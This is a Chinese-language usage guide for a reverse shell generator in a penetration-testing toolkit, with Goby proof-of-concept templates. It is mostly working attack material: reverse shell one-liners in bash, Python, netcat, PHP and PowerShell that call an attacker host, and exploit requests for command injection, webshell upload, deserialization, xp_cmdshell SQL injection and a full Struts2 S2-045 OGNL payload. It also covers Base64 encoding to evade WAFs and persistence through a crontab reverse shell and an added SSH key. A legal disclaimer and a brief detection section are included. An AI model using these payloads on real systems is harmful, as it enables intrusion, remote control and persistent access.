# 反弹Shell生成器使用说明

## 📖 概述

反弹Shell是渗透测试中获取目标系统Shell访问权限的常用技术。当发现RCE（远程代码执行）漏洞时，可以使用反弹Shell Payload获取交互式Shell。

---

## 🎯 支持的Shell类型

### 1. Bash (推荐 - Linux/Unix) ⭐

```bash
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```

**特点**:
- ✅ Linux/Unix系统标准
- ✅ 无需额外依赖
- ✅ 兼容性好

**适用系统**: Linux, Unix, macOS

---

### 2. Python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));...'
```

**特点**:
- ✅ 跨平台
- ✅ 功能强大
- ⚠️ 需要Python环境

**适用系统**: Linux, Windows, macOS

---

### 3. Netcat (nc)

```bash
nc -e /bin/sh 192.168.1.100 4444
```

**特点**:
- ✅ 简单直接
- ⚠️ 某些nc版本不支持-e参数

**适用系统**: Linux, Unix

---

### 4. PowerShell (Windows) ⭐

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "..."
```

**特点**:
- ✅ Windows原生支持
- ✅ 无需额外工具
- ✅ 功能强大

**适用系统**: Windows

---

### 5. PHP

```bash
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**特点**:
- ✅ Web服务器常见
- ✅ 适合PHP应用
- ⚠️ 需要PHP CLI

**适用系统**: Linux (有PHP环境)

---

### 其他支持的类型

- **Perl**: `perl -e 'use Socket;...'`
- **Ruby**: `ruby -rsocket -e'...'`
- **Java**: Runtime.getRuntime().exec(...)
- **Telnet**: mkfifo + telnet组合

---

## 🚀 快速开始

### API使用

```java
import com.potato.potatotool.content.redTeam.vulnScanner.http.ReverseShellGenerator;

// 1. 生成Bash反弹Shell
String bashPayload = ReverseShellGenerator.generate(
    "192.168.1.100",  // 攻击者IP
    4444,              // 攻击者端口
    ReverseShellGenerator.ShellType.BASH
);

System.out.println("Bash Payload: " + bashPayload);

// 2. 生成PowerShell反弹Shell
String psPayload = ReverseShellGenerator.generate(
    "192.168.1.100",
    4444,
    ReverseShellGenerator.ShellType.POWERSHELL
);

// 3. 生成监听器命令
String listener = ReverseShellGenerator.generateListenerCommand(4444);
System.out.println("监听器: " + listener);
```

---

## 📝 在Goby POC中使用

### 方法1: 使用 @@reverse_shell() 函数

```json
{
  "Request": {
    "method": "POST",
    "uri": "/api/exec",
    "data": "cmd=@@reverse_shell(192.168.1.100, 4444, bash)"
  }
}
```

### 方法2: 配合变量使用

```json
{
  "ExpParams": [
    {"Name": "attacker_ip", "Type": "input", "Value": "192.168.1.100"},
    {"Name": "attacker_port", "Type": "input", "Value": "4444"},
    {"Name": "shell_type", "Type": "createSelect", "Value": "bash,python,nc,powershell"}
  ],
  "ExploitSteps": ["AND", {
    "Request": {
      "data": "cmd={{{payload}}}",
      "set_variable": [
        "payload|define|text|@@reverse_shell({{{attacker_ip}}}, {{{attacker_port}}}, {{{shell_type}}})"
      ]
    }
  }]
}
```

**优势**:
- ✅ 用户可以自定义IP和端口
- ✅ 可以选择Shell类型
- ✅ 灵活性高

---

## 🎓 完整使用流程

### 步骤1: 在攻击者机器上启动监听器

```bash
# 使用nc监听4444端口
nc -lvnp 4444

# 或者使用其他工具
# socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash
# pwncat-cs -lp 4444
```

### 步骤2: 生成反弹Shell Payload

```java
String payload = ReverseShellGenerator.generate(
    "攻击者IP",
    4444,
    ReverseShellGenerator.ShellType.BASH
);
```

### 步骤3: 发送Payload到目标

```java
// 通过RCE漏洞执行
String rceUrl = "http://target.com/exec?cmd=" + URLEncoder.encode(payload);
// 发送请求...
```

### 步骤4: 在监听器中获得Shell

```bash
listening on [any] 4444 ...
connect to [192.168.1.100] from (UNKNOWN) [target.ip] 12345
bash: no job control in this shell
target@hostname:/$
```

---

## 🔍 典型应用场景

### 场景1: 命令注入GetShell

```json
{
  "Name": "命令注入GetShell",
  "ExploitSteps": ["AND", {
    "Request": {
      "uri": "/api/ping?host=127.0.0.1;@@reverse_shell(192.168.1.100, 4444, bash)"
    }
  }]
}
```

### 场景2: 文件上传后执行

```json
{
  "ExploitSteps": [
    {
      "Request": {
        "method": "POST",
        "uri": "/upload.php",
        "data": "<?php system('@@reverse_shell(192.168.1.100, 4444, bash)'); ?>"
      }
    },
    {
      "Request": {
        "method": "GET",
        "uri": "/uploads/shell.php"
      }
    }
  ]
}
```

### 场景3: 反序列化利用

```json
{
  "Request": {
    "data": "{\"@type\":\"java.lang.Runtime\",\"cmd\":\"@@reverse_shell(192.168.1.100, 4444, bash)\"}"
  }
}
```

### 场景4: SQL注入执行命令

```json
{
  "Request": {
    "uri": "/api/user?id=1'; exec xp_cmdshell '@@reverse_shell(192.168.1.100, 4444, powershell)'--"
  }
}
```

---

## 🔧 高级用法

### 1. Payload编码

```java
// Base64编码（绕过WAF）
String payload = ReverseShellGenerator.generate(ip, port, type, 
    ReverseShellGenerator.EncodingType.BASE64);

// URL编码
String payload = ReverseShellGenerator.generate(ip, port, type,
    ReverseShellGenerator.EncodingType.URL);
```

### 2. 组合使用

```json
{
  "data": "cmd=@@base64(@@reverse_shell(192.168.1.100, 4444, bash))"
}
```

**说明**: 先生成Shell，再Base64编码

### 3. 备用Payload

```java
// Bash备用方式
String payload = ReverseShellGenerator.generateBashExecPayload(ip, port);

// Netcat无-e参数版本
String payload = ReverseShellGenerator.generateNcNoePayload(ip, port);

// Python3专用
String payload = ReverseShellGenerator.generatePython3Payload(ip, port);
```

---

## 💡 最佳实践

### 1. 选择合适的Shell类型

| 目标系统 | 推荐类型 | 备选类型 |
|---------|---------|---------|
| Linux | Bash | Python, NC |
| Windows | PowerShell | Python |
| Web服务器 | PHP | Perl, Python |
| 通用 | Python | Bash |

### 2. 编码绕过WAF

```java
// 示例：Base64编码的Bash Shell
String rawPayload = ReverseShellGenerator.generate(ip, port, ShellType.BASH);
String encodedPayload = "echo " + 
    Base64.getEncoder().encodeToString(rawPayload.getBytes()) + 
    " | base64 -d | bash";
```

### 3. 测试监听器

```bash
# 测试监听器是否正常
nc -lvnp 4444

# 测试连接
nc 192.168.1.100 4444
```

### 4. 网络要求

- ✅ 目标必须能连接到攻击者IP和端口
- ✅ 防火墙需要允许出站连接
- ✅ 某些端口可能被阻止（建议用443、53等常用端口）

---

## ⚠️ 安全和法律提示

### 🚨 重要提示

1. **仅用于授权测试**
   - 必须获得明确的书面授权
   - 仅在测试环境或授权范围内使用
   - 禁止用于非法入侵

2. **测试环境要求**
   - 使用隔离的测试环境
   - 做好日志记录
   - 测试完成后清理

3. **责任声明**
   - 本工具仅供安全研究和授权测试
   - 使用者需对自己的行为负责
   - 违法使用后果自负

---

## 🔧 故障排查

### 问题1: 反弹连接失败

**可能原因**:
1. IP或端口不正确
2. 防火墙阻止
3. 网络不通

**解决方案**:
```bash
# 检查网络连通性
ping 192.168.1.100

# 检查端口是否监听
netstat -an | grep 4444

# 尝试其他端口（如80、443、53）
```

### 问题2: Shell不稳定

**解决方案**:
```bash
# 升级为完全交互式Shell
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

### 问题3: Payload被WAF拦截

**解决方案**:
```java
// 使用编码
String encoded = ReverseShellGenerator.generate(ip, port, type, EncodingType.BASE64);

// 或尝试其他Shell类型
String alternative = ReverseShellGenerator.generate(ip, port, ShellType.PYTHON);
```

---

## 📚 API参考

### 核心方法

```java
// 生成Payload（默认类型）
String payload = ReverseShellGenerator.generate(String ip, int port, ShellType type);

// 生成Payload（带编码）
String payload = ReverseShellGenerator.generate(String ip, int port, ShellType type, EncodingType encoding);

// 生成监听器命令
String listener = ReverseShellGenerator.generateListenerCommand(int port);

// 根据OS推荐类型
ShellType type = ReverseShellGenerator.getRecommendedType(String os);

// 打印所有类型
ReverseShellGenerator.printAllPayloads(String ip, int port);
```

### Shell类型枚举

```java
ShellType.BASH          // Bash Shell
ShellType.PYTHON        // Python Shell
ShellType.NC            // Netcat
ShellType.POWERSHELL    // PowerShell
ShellType.PHP           // PHP
ShellType.PERL          // Perl
ShellType.RUBY          // Ruby
ShellType.JAVA          // Java
ShellType.TELNET        // Telnet
```

### 编码类型枚举

```java
EncodingType.NONE       // 无编码
EncodingType.BASE64     // Base64编码
EncodingType.URL        // URL编码
EncodingType.HEX        // 十六进制编码
```

---

## 🎓 完整示例

### 示例1: 简单RCE GetShell

```java
public class SimpleRCE {
    public static void main(String[] args) {
        // 1. 生成Payload
        String payload = ReverseShellGenerator.generate(
            "192.168.1.100",
            4444,
            ReverseShellGenerator.ShellType.BASH
        );
        
        // 2. 显示监听器命令
        String listener = ReverseShellGenerator.generateListenerCommand(4444);
        System.out.println("请先执行: " + listener);
        
        // 3. 构造RCE请求
        String rceUrl = "http://target.com/exec?cmd=" + 
            java.net.URLEncoder.encode(payload, "UTF-8");
        
        System.out.println("发送RCE Payload...");
        // sendRequest(rceUrl);
        
        System.out.println("请检查监听器是否收到连接");
    }
}
```

### 示例2: 在Goby POC中完整使用

```json
{
  "Name": "Struts2 S2-045 GetShell",
  "Level": "1",
  "HasExp": true,
  "ExpParams": [
    {
      "Name": "attacker_ip",
      "Type": "input",
      "Value": "192.168.1.100"
    },
    {
      "Name": "attacker_port",
      "Type": "input",
      "Value": "4444"
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/login.action",
        "header": {
          "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{{{shell_payload}}}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        },
        "data": "",
        "set_variable": [
          "shell_payload|define|text|@@reverse_shell({{{attacker_ip}}}, {{{attacker_port}}}, bash)"
        ]
      },
      "ResponseTest": {
        "checks": [{
          "variable": "$code",
          "operation": "==",
          "value": "200"
        }]
      }
    }
  ]
}
```

---

## 🛡️ 防御和检测

### 攻击者视角（渗透测试）

1. **启动监听器**
   ```bash
   nc -lvnp 4444
   ```

2. **发送Payload**
   - 通过RCE漏洞执行

3. **获得Shell**
   - 在监听器中交互

### 防御者视角（蓝队）

1. **出站连接监控**
   - 监控异常的外网连接
   - 特别是向非标准端口的连接

2. **命令执行监控**
   - 监控bash/python等解释器异常调用
   - 监控/dev/tcp使用

3. **防护措施**
   - 限制出站连接
   - 命令白名单
   - WAF规则

---

## 💡 技巧和窍门

### 1. 端口选择

```
推荐端口（容易通过防火墙）:
- 80   (HTTP)
- 443  (HTTPS)
- 53   (DNS)
- 8080 (HTTP备用)
```

### 2. 稳定性提升

```bash
# 获得Shell后，升级为完全交互式
python -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z 暂停
stty raw -echo; fg
export TERM=xterm
```

### 3. 持久化

```bash
# 添加crontab
echo "* * * * * /bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1" | crontab -

# 添加SSH key
echo "ssh-rsa ..." >> ~/.ssh/authorized_keys
```

---

## 🎁 常用命令速查

```bash
# 监听器
nc -lvnp 4444                    # Netcat
socat TCP-LISTEN:4444 -          # Socat
pwncat-cs -lp 4444               # Pwncat

# 测试连接
nc 192.168.1.100 4444            # 测试端口
telnet 192.168.1.100 4444        # Telnet测试

# Shell升级
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash

# 信息收集
uname -a                         # 系统信息
id                               # 用户信息
netstat -an                      # 网络连接
ps aux                           # 进程列表
```

---

## 📚 参考资源

- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- https://www.revshells.com/

---

**文档版本**: v1.0  
**最后更新**: 2025-11-01  
**维护者**: Potato


















